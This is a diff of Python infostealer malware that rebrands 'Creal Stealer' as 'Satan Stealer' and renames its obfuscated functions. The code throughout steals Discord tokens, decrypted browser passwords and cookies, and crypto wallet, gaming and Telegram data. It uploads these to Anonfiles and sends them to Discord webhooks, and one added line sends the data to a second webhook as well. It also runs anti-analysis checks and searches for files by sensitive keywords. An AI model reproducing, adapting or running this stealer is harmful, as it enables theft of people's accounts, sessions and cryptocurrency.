+        urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
         return
-
 
 
 
@@ -532,21 +462,17 @@ def upload(name, link):
 
 #     # r = requests.post(hook, files=files)
 #     LoadRequests("POST", hook, files=files)
-    _
 
-
-
-
-def wr1tef0rf1l3(data, name):
-    path = os.getenv("TEMP") + f"\cr{name}.txt"
+def writeforfile(data, name):
+    path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--Creal STEALER BEST -->\n\n")
+        f.write(f"<--Satan STEALER ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
 
-T0k3ns = ''
-def getT0k3n(path, arg):
+Tokens = ''
+def getToken(path, arg):
     if not os.path.exists(path): return
 
     path += arg
@@ -554,23 +480,23 @@ def getT0k3n(path, arg):
         if file.endswith(".log") or file.endswith(".ldb")   :
             for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                 for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
-                    for t0k3n in re.findall(regex, line):
-                        global T0k3ns
-                        if ch1ckT4k1n(t0k3n):
-                            if not t0k3n in T0k3ns:
+                    for token in re.findall(regex, line):
+                        global Tokens
+                        if checkToken(token):
+                            if not token in Tokens:
                                 # print(token)
-                                T0k3ns += t0k3n
-                                upl05dT4k31(t0k3n, path)
+                                Tokens += token
+                                uploadToken(token, path)
 
-P4ssw = []
-def getP4ssw(path, arg):
-    global P4ssw, P4sswCount
+Passw = []
+def getPassw(path, arg):
+    global Passw, PasswCount
     if not os.path.exists(path): return
 
     pathC = path + arg + "/Login Data"
     if os.stat(pathC).st_size == 0: return
 
-    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -595,19 +521,19 @@ def getP4ssw(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in paswWords: paswWords.append(old)
-            P4ssw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}")
-            P4sswCount += 1
-    wr1tef0rf1l3(P4ssw, 'passw')
+            Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
+            PasswCount += 1
+    writeforfile(Passw, 'passw')
 
-C00k13 = []    
-def getC00k13(path, arg):
-    global C00k13, CookiCount
+Cookies = []    
+def getCookie(path, arg):
+    global Cookies, CookiCount
     if not os.path.exists(path): return
     
     pathC = path + arg + "/Cookies"
     if os.stat(pathC).st_size == 0: return
     
-    tempfold = temp + "cr" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
+    tempfold = temp + "wp" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
     
     shutil.copy2(pathC, tempfold)
     conn = sql_connect(tempfold)
@@ -633,11 +559,11 @@ def getC00k13(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in cookiWords: cookiWords.append(old)
-            C00k13.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{D3kryptV4lU3(row[2], master_key)}")
+            Cookies.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
             CookiCount += 1
-    wr1tef0rf1l3(C00k13, 'cook')
+    writeforfile(Cookies, 'cook')
 
-def G3tD1sc0rd(path, arg):
+def GetDiscord(path, arg):
     if not os.path.exists(f"{path}/Local State"): return
 
     pathC = path + arg
@@ -652,25 +578,25 @@ def G3tD1sc0rd(path, arg):
         # print(path, file)
         if file.endswith(".log") or file.endswith(".ldb")   :
             for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
-                for t0k3n in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
-                    global T0k3ns
-                    t0k3nDecoded = D3kryptV4lU3(b64decode(t0k3n.split('dQw4w9WgXcQ:')[1]), master_key)
-                    if ch1ckT4k1n(t0k3nDecoded):
-                        if not t0k3nDecoded in T0k3ns:
+                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
+                    global Tokens
+                    tokenDecoded = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
+                    if checkToken(tokenDecoded):
+                        if not tokenDecoded in Tokens:
                             # print(token)
-                            T0k3ns += t0k3nDecoded
+                            Tokens += tokenDecoded
                             # writeforfile(Tokens, 'tokens')
-                            upl05dT4k31(t0k3nDecoded, path)
+                            uploadToken(tokenDecoded, path)
 
 def GatherZips(paths1, paths2, paths3):
     thttht = []
     for patt in paths1:
-        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]])
+        a = threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]])
         a.start()
         thttht.append(a)
 
     for patt in paths2:
-        a = threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]])
+        a = threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]])
         a.start()
         thttht.append(a)
     
@@ -685,40 +611,41 @@ def GatherZips(paths1, paths2, paths3):
 
     wal, ga, ot = "",'',''
     if not len(WalletsZip) == 0:
-        wal = ":coin:  •  Wallets\n"
+        wal = "<:ETH:975438262053257236> •  Wallets\n"
         for i in WalletsZip:
             wal += f"└─ [{i[0]}]({i[1]})\n"
     if not len(WalletsZip) == 0:
-        ga = ":video_game:  •  Gaming:\n"
+        ga = "<a:8593blackstar:1042395444606672927>  •  Gaming:\n"
         for i in GamingZip:
             ga += f"└─ [{i[0]}]({i[1]})\n"
     if not len(OtherZip) == 0:
-        ot = ":tickets:  •  Apps\n"
+        ot = "<a:LV1:1042397877722423368>  •  Apps\n"
         for i in OtherZip:
             ot += f"└─ [{i[0]}]({i[1]})\n"          
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
-    
+
     data = {
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Creal Zips",
+            "title": "Satan Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": "Creal Stealer",
-                "icon_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg"
+                "text": "Satan Stealer",
+                "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
             }
             }
         ],
-        "username": "Creal Stealer",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg",
+        "username": "Satan Stealer",
+        "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
         "attachments": []
     }
-    L04durl1b(hook, data=dumps(data).encode(), headers=headers)
+    urlopen(Request(myhook, data=dumps(data).encode(), headers=headers))
+    LoadUrlib(hook, data=dumps(data).encode(), headers=headers)
 
 
 def ZipTelegram(path, arg, procc):
@@ -735,11 +662,11 @@ def ZipTelegram(path, arg, procc):
     zf.close()
 
     lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    #lnik = "https://google.com"
+    
     os.remove(f"{pathC}/{name}.zip")
     OtherZip.append([arg, lnik])
 
-def Z1pTh1ngs(path, arg, procc):
+def ZipThings(path, arg, procc):
     pathC = path
     name = arg
     global WalletsZip, GamingZip, OtherZip
@@ -777,7 +704,7 @@ def Z1pTh1ngs(path, arg, procc):
     zf.close()
 
     lnik = uploadToAnonfiles(f'{pathC}/{name}.zip')
-    #lnik = "https://google.com"
+    
     os.remove(f"{pathC}/{name}.zip")
 
     if "Wallet" in arg or "eogaeaoehlef" in arg:
@@ -818,22 +745,22 @@ def GatherAll():
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
 
     for patt in browserPaths: 
-        a = threading.Thread(target=getT0k3n, args=[patt[0], patt[2]])
+        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
         a.start()
         Threadlist.append(a)
     for patt in discordPaths: 
-        a = threading.Thread(target=G3tD1sc0rd, args=[patt[0], patt[1]])
+        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
         a.start()
         Threadlist.append(a)
 
     for patt in browserPaths: 
-        a = threading.Thread(target=getP4ssw, args=[patt[0], patt[3]])
+        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])
         a.start()
         Threadlist.append(a)
 
     ThCokk = []
     for patt in browserPaths: 
-        a = threading.Thread(target=getC00k13, args=[patt[0], patt[4]])
+        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])
         a.start()
         ThCokk.append(a)
 
@@ -841,23 +768,23 @@ def GatherAll():
 
 
     for thread in ThCokk: thread.join()
-    DETECTED = TR6st(C00k13)
+    DETECTED = Trust(Cookies)
     if DETECTED == True: return
 
-    for patt in browserPaths:
-         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[5], patt[1]]).start()
+    # for patt in browserPaths:
+    #     threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()
     
-    for patt in PathsToZip:
-         threading.Thread(target=Z1pTh1ngs, args=[patt[0], patt[2], patt[1]]).start()
+    # for patt in PathsToZip:
+    #     threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()
     
-    threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
+    # threading.Thread(target=ZipTelegram, args=[Telegram[0], Telegram[2], Telegram[1]]).start()
 
     for thread in Threadlist: 
         thread.join()
     global upths
     upths = []
 
-    for file in ["crpassw.txt", "crcook.txt"]: 
+    for file in ["wppassw.txt", "wpcook.txt"]: 
         # upload(os.getenv("TEMP") + "\\" + file)
         upload(file.replace(".txt", ""), uploadToAnonfiles(os.getenv("TEMP") + "\\" + file))
 
@@ -920,28 +847,8 @@ def Kiwi():
         "account",
         "acount",
         "passw",
-        "secret",
-        "senhas",
-        "contas",
-        "backup",
-        "2fa",
-        "importante",
-        "privado",
-        "exodus",
-        "exposed",
-        "perder",
-        "amigos",
-        "empresa",
-        "trabalho",
-        "work",
-        "private",
-        "source",
-        "users",
-        "username",
-        "login",
-        "user",
-        "usuario",
-        "log"
+        "secret"
+
     ]
 
     key_wordsFiles = [
@@ -955,7 +862,7 @@ def Kiwi():
         "acount",
         "paypal",
         "banque",
-        "account",                                                          
+        "account",
         "metamask",
         "wallet",
         "crypto",
@@ -967,9 +874,21 @@ def Kiwi():
         "compte",
         "token",
         "backup",
-        "secret",
-        "mom",
-        "family"
+        "oge",
+        "4l",
+        "pdf",
+        "info",
+        "@",
+        "3l",
+        "insta",
+        "early",
+        "14d",
+        "autoclaim",
+        "method",
+        "pull",
+        "nft",
+        "tiktok"
+        "secret"
         ]
 
     wikith = []
@@ -979,13 +898,13 @@ def Kiwi():
     return wikith
 
 
-global keyword, cookiWords, paswWords, CookiCount, P4sswCount, WalletsZip, GamingZip, OtherZip
+global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip
 
 keyword = [
-    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)'
+    'mail', '[coinbase](https://coinbase.com)', '[sellix](https://sellix.io)', '[gmail](https://gmail.com)', '[steam](https://steam.com)', '[discord](https://discord.com)', '[riotgames](https://riotgames.com)', '[youtube](https://youtube.com)', '[instagram](https://instagram.com)', '[tiktok](https://tiktok.com)', '[twitter](https://twitter.com)', '[facebook](https://facebook.com)', 'card', '[epicgames](https://epicgames.com)', '[spotify](https://spotify.com)', '[yahoo](https://yahoo.com)', '[roblox](https://roblox.com)', '[twitch](https://twitch.com)', '[minecraft](https://minecraft.net)', 'bank', '[paypal](https://paypal.com)', '[origin](https://origin.com)', '[amazon](https://amazon.com)', '[ebay](https://ebay.com)', '[aliexpress](https://aliexpress.com)', '[playstation](https://playstation.com)', '[hbo](https://hbo.com)', '[xbox](https://xbox.com)', 'buy', 'sell', '[binance](https://binance.com)', '[hotmail](https://hotmail.com)', '[outlook](https://outlook.com)', '[crunchyroll](https://crunchyroll.com)', '[telegram](https://telegram.com)', '[pornhub](https://pornhub.com)', '[disney](https://disney.com)', '[expressvpn](https://expressvpn.com)', 'crypto', '[uber](https://uber.com)', '[netflix](https://netflix.com)', '[ogu](https://ogu.gg/)', '[epicnpc](https://epicnpc.com)', '[github](https://github.com)', '[krunker](https://krunker.io)' 
 ]
 
-CookiCount, P4sswCount = 0, 0
+CookiCount, PasswCount = 0, 0
 cookiWords = []
 paswWords = []
 
@@ -994,7 +913,7 @@ GamingZip = []
 OtherZip = []
 
 GatherAll()
-DETECTED = TR6st(C00k13)
+DETECTED = Trust(Cookies)
 # DETECTED = False
 if not DETECTED:
     wikith = Kiwi()
@@ -1007,12 +926,12 @@ if not DETECTED:
         if len(arg[2]) != 0:
             foldpath = arg[1]
             foldlist = arg[2]       
-            filetext += f"📁 {foldpath}\n"
+            filetext += f" <:openfolderblackandwhitevariant:1042409305254670356> {foldpath}\n"
 
             for ffil in foldlist:
                 a = ffil[0].split("/")
                 fileanme = a[len(a)-1]
                 b = ffil[1]
-                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
+                filetext += f"└─<:open_file_folder: [{fileanme}]({b})\n"
             filetext += "\n"
     upload("kiwi", filetext)
